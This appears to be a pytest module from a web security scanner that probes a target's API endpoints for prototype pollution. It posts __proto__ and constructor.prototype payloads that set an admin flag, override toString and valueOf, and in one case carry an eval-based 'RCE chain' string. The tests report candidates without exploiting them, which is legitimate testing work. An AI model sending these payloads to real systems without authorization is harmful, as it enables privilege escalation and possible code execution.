"""Category 40: Prototype Pollution — __proto__ and constructor manipulation."""
import json
import pytest

from tests.active.helpers import safe_get, safe_post, url_join
from tests.active.config import TARGET_URL

PROTOTYPE_POLLUTION_ENDPOINTS = [
    "/api/config", "/api/settings", "/api/user", "/api/data",
    "/merge", "/process", "/api/save", "/apply",
]

PROTOTYPE_PAYLOADS = {
    "proto_admin": {"__proto__": {"admin": True}, "user": "test"},
    "constructor": {"constructor": {"prototype": {"admin": True}}, "user": "test"},
    "nested_proto": {"data": {"__proto__": {"isAdmin": True}}},
}


class TestPrototypePollutionBasic:
    def test_prototype_pollution_admin_flag(self):
        """Test basic prototype pollution via __proto__ for admin elevation."""
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          json=PROTOTYPE_PAYLOADS["proto_admin"],
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Prototype pollution candidate at {endpoint}: "
                    "__proto__ manipulation accepted"
                )


class TestPrototypePollutionConstructor:
    def test_prototype_pollution_via_constructor(self):
        """Test prototype pollution via constructor.prototype."""
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          json=PROTOTYPE_PAYLOADS["constructor"],
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Constructor-based prototype pollution at {endpoint}"
                )


class TestPrototypePollutionNested:
    def test_prototype_pollution_nested_objects(self):
        """Test prototype pollution in nested object merge."""
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          json=PROTOTYPE_PAYLOADS["nested_proto"],
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Nested prototype pollution at {endpoint}"
                )


class TestPrototypePollutionQueryString:
    def test_prototype_pollution_query_string(self):
        """Test prototype pollution via query string parameters."""
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            r = safe_get(f"{url_join(endpoint)}?__proto__[admin]=true&user=test",
                        allow_redirects=False)
            if r and r.status_code == 200:
                pytest.skip(
                    f"Query string prototype pollution at {endpoint}"
                )


class TestPrototypePollutionArrayMerge:
    def test_prototype_pollution_array_merge(self):
        """Test prototype pollution in array merge operations."""
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            payload = {
                "items": [
                    {"__proto__": {"admin": True}},
                    {"name": "item"}
                ]
            }
            r = safe_post(url_join(endpoint),
                          json=payload,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Array merge prototype pollution at {endpoint}"
                )


class TestPrototypePollutionFunctionPrototype:
    def test_prototype_pollution_function_override(self):
        """Test prototype pollution to override function behavior."""
        # Try to override toString, valueOf, etc.
        payload = {
            "__proto__": {
                "toString": "function() { return 'hacked'; }",
                "valueOf": "function() { return true; }"
            }
        }
        
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          json=payload,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Function prototype override at {endpoint}"
                )


class TestPrototypePollutionCodeExecution:
    def test_prototype_pollution_rce_via_constructor(self):
        """Test prototype pollution leading to RCE via constructor chain."""
        # Advanced exploitation: constructor.prototype.call, etc.
        payload = {
            "constructor": {
                "prototype": {
                    "call": "function() { return eval('dangerous'); }"
                }
            }
        }
        
        for endpoint in PROTOTYPE_POLLUTION_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          json=payload,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"RCE-chain prototype pollution at {endpoint}"
                )


class TestPrototypePollutionDetection:
    def test_verify_prototype_pollution_impact(self):
        """Verify if prototype pollution actually affects application state."""
        pytest.skip(
            "Prototype pollution impact verification requires: "
            "1) Injecting prototype pollution payload "
            "2) Making a subsequent request to verify global state change "
            "3) Confirming object property change across all instances. "
            "Test by checking if admin=true persists across requests "
            "or affects all user objects."
        )


class TestPrototypePollutionSkipped:
    def test_prototype_pollution_rce_destructive(self):
        pytest.skip(
            "Prototype pollution RCE exploitation is DESTRUCTIVE. "
            "Only test with full understanding of code paths and impact. "
            "Verify in isolated test environment."
        )

    def test_prototype_pollution_javascript_only(self):
        pytest.skip(
            "Prototype pollution primarily affects JavaScript objects. "
            "Other languages (Python, Java) may be vulnerable to similar "
            "deserialization/merge attacks but with different patterns. "
            "Check language-specific vulnerabilities in test suite."
        )
